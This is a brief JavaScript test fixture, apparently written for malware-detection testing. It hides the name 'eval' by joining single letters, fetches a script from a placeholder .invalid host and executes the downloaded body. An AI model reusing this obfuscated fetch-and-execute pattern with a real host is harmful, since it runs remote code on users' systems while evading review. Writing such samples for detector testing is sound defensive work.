// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: eval is looked up on the global object by a name joined from single letters, and is
// given the body of an https response. Host is a non-existent .invalid domain.
const g = globalThis;
const k = ["e", "v", "a", "l"].join("");
require("https").get("https://dl.example.invalid/s.js", (r) => {
  let d = "";
  r.on("data", (c) => (d += c));
  r.on("end", () => g[k](d));
});
